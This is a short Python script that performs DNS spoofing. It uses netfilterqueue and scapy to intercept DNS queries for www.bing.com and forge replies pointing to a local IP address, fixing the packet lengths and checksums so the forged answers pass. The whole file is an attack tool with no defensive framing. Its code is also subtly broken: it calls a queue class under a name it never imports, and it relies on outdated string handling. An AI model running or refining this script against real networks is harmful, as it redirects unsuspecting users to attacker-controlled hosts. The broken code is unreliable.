from netfilterqueue import NetfilterQueue
import scapy.all as sc


def process_packet(packet):
    sc_paket = sc.IP(packet.get_payload())
    if sc_paket.haslayer(sc.DNSQR):
        qname = sc_paket[sc.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = sc.DNSRR(rrname=qname, rdata="192.168.100.93")
            sc_paket[sc.DNS].an = answer
            sc_paket[sc.DNS].ancount = 1

            del sc_paket[sc.IP].len
            del sc_paket[sc.IP].chksum
            del sc_paket[sc.UDP].chksum
            del sc_paket[sc.UDP].len

            packet.set_payload(str(sc_paket))

    packet.accept()


queue = netfilterqueue.Netfilterqueue()
queue.bind(0, process_packet)
queue.run()
